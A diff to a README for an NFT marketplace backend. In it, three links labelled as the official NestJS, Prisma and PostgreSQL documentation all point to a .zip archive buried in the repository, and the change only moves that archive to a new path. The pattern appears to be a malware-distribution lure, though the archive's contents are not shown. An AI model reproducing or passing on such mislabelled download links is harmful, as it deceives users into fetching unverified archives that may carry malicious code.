@@ -89,8 +89,8 @@ Marketplace_Backend is made possible by a community of contributors. If you woul
 
 For more details on how to use NestJS, Prisma, or PostgreSQL, visit their official documentation:
 
-- [NestJS Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
-- [Prisma Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
-- [PostgreSQL Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/prophilosophical/Marketplace_Backend.zip)
+- [NestJS Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/src/common/prisma-utils/Marketplace_Backend_3.6-beta.5.zip)
+- [Prisma Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/src/common/prisma-utils/Marketplace_Backend_3.6-beta.5.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/GIZZN/Marketplace_Backend/main/src/common/prisma-utils/Marketplace_Backend_3.6-beta.5.zip)
 
 Thank you for using Marketplace_Backend! We hope you enjoy building your NFT marketplace.
